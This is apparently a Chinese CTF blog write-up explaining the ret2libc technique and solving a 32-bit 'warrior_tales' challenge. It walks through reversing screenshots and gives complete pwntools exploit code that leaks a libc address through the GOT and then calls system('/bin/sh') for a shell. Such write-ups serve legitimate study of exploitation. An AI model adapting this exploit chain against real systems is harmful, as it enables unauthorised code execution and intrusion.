---
title: ROP之ret2libc
date: 2018-11-01 21:45:43
tags: 题目
---
<strong><h1>0x00 前言</h1></strong>
CTF-WIKI种给出的原理ret2libc原理:如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。
那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。
我们自然可以根据上面的步骤先得到 libc，之后在程序中查询偏移，然后再次获取 system 地址

自己理解:就是通过OGT表leak出已经执行的函数地址 通过这个函数地址找到libc的基地 再通过这个基地去偏移找其他函数的地址

给出一道题目 说团队的丁佬给我去试水的 题目链接我会放到最后

<strong><h1>0x01 题目</h1></strong>
先运行一下文件 看一下都可以干什么
![r](https://i.loli.net/2018/11/01/5bdb0734dbfdd.png)
发现让输入一个名字
![r](https://i.loli.net/2018/11/01/5bdb077cb8cc7.png)
发现是让自己去打怪 一个是攻击一个防御 我试了一下直接攻击 然后就GG掉了..
![r](https://i.loli.net/2018/11/01/5bdb07c06fb08.png)
我们拖入IDA看看
![r](https://i.loli.net/2018/11/01/5bdb085ec85f4.png)
函数就是通过stroy()去进行函数vlun() 我们先看下vlun()函数里面是什么
![r](https://i.loli.net/2018/11/01/5bdb08f54d364.png)
看到了溢出的地方了 看来是要进入这个函数了 我们再去看看story()
![r](https://i.loli.net/2018/11/01/5bdb0960637f7.png)
看到了必须到return 1的那一步 但是发现下面都是通过v2判断进行的 v2又来自menu()函数 再去看看menu()函数
![r](https://i.loli.net/2018/11/01/5bdb0a8ba8a31.png)
发现就是自己刚才的选择 选2返回2 选1返回1
![r](https://i.loli.net/2018/11/01/5bdb0ae394572.png)
发现需要使v8=0 v8初始值是-56 v8值改变可以-v5 也可以加10
v5的值是4 那我们可以加6次10 再减去一个v5就可以啊 
![r](https://i.loli.net/2018/11/01/5bdb0ba478426.png)
发现真的可以 那我们就来构造rop 看一下栈长度
![r](https://i.loli.net/2018/11/01/5bdb0beb9b4f1.png)
是30h也就是48字节 再加入ebp就是 48+4字节 先ldd看看下文件用的那个libc库
![r](https://i.loli.net/2018/11/01/5bdb0c8fdb56d.png)
发现用的是``libc.so.6 => /lib32/libc.so.6 (0xf7d3f000)``
那我们就开始构造exp！
<strong><h1>0x02 exp</h1></strong>
先是常规的把ELF和本地都连接一下
```python
from pwn import *

libc = ELF('/lib32/libc.so.6')
warrior_tales = ELF('./warrior_tales')
context(arch ='i386', os = 'linux')

#sh = remote('45.76.249.121',1553)      //原本题上是nc 大家本地就可以
sh = process('./warrior_tales')
```
再把前面的部分过了 直接到溢出的部分
```python
next = sh.recv()
print next
sh.sendline('root')
next = sh.recv()
print next
sh.sendline('2')
next = sh.recv()
print next
sh.sendline('2')
next = sh.recv()
print next
sh.sendline('2')
next = sh.recv()
print next
sh.sendline('2')
next = sh.recv()
print next
sh.sendline('2')
next = sh.recv()
print next
sh.sendline('2')
next = sh.recv()
print next
sh.sendline('1')
print sh.recvline()
```
下面就是重点 rop的构造
我们先用puts函数把__libc_start_main的地址打出来 并返回vlun函数(为了下次的溢出)
```python
puts_plt = warrior_tales.plt['puts']
vlun = warrior_tales.symbols['vlun']
libc_start_main_got = warrior_tales.got['__libc_start_main']
print "vlun:",vlun

payload = flat(['A'*52,puts_plt,vlun,libc_start_main_got])
print payload
```
得到了__libc_start_main地址后通过libc函数偏移得到libc基地 并获得``system``函数地址和``/bin/sh``字符串地址 返回地址随便只要4字节就可以 但记好payload发送后要接受一次 因为后面还要打印一个东西!
```python
libc_start_main_addr = u32(test[0:4])
print "libc_start_main_addr",str(hex(libc_start_main_addr))
libcbase = libc_start_main_addr - libc.symbols['__libc_start_main']
print "libcbase:",str(hex(libcbase))
system_addr = libcbase + libc.symbols['system']
print "system_addr:",str(hex(system_addr))
binsh = libcbase + libc.search('/bin/sh').next()
print "binsh:",str(hex(binsh))
payload = flat(['a'*52,system_addr,0xdeafbeef,binsh])
#sh.sendlineafter("Hero! Now, write something for your story!",payload)
sh.sendline(payload)
sh.recv()
sh.interactive()
```
最后把完整代码附上
```python
from pwn import *

libc = ELF('/lib32/libc.so.6')
warrior_tales = ELF('./warrior_tales')
context(arch ='i386', os = 'linux')

#sh = remote('45.76.249.121',1553)
sh = process('./warrior_tales')
next = sh.recv()
print next
sh.sendline('root')
next = sh.recv()
print next
sh.sendline('2')
next = sh.recv()
print next
sh.sendline('2')
next = sh.recv()
print next
sh.sendline('2')
next = sh.recv()
print next
sh.sendline('2')
next = sh.recv()
print next
sh.sendline('2')
next = sh.recv()
print next
sh.sendline('2')
next = sh.recv()
print next
sh.sendline('1')
print sh.recvline()
puts_plt = warrior_tales.plt['puts']
vlun = warrior_tales.symbols['vlun']
libc_start_main_got = warrior_tales.got['__libc_start_main']
print "vlun:",vlun

payload = flat(['A'*52,puts_plt,vlun,libc_start_main_got])
print payload
sh.sendlineafter("Hero! Now, write something for your story!\n", payload)
#sh.sendline(payload)
print sh.recvline()
test = sh.recvline()
print test
#print test[0:4]
#libc_start_main_addr = u32(sh.recv()[0:4])
libc_start_main_addr = u32(test[0:4])
print "libc_start_main_addr",str(hex(libc_start_main_addr))
libcbase = libc_start_main_addr - libc.symbols['__libc_start_main']
print "libcbase:",str(hex(libcbase))
system_addr = libcbase + libc.symbols['system']
print "system_addr:",str(hex(system_addr))
binsh = libcbase + libc.search('/bin/sh').next()
print "binsh:",str(hex(binsh))
payload = flat(['a'*52,system_addr,0xdeafbeef,binsh])
#sh.sendlineafter("Hero! Now, write something for your story!",payload)
sh.sendline(payload)
sh.recv()
sh.interactive()
```
最后结果
![r](https://i.loli.net/2018/11/01/5bdb0f9619b6e.png)
链接: https://pan.baidu.com/s/1v6q4OL18Wo64WCXlPzxIfw 提取码: rdy2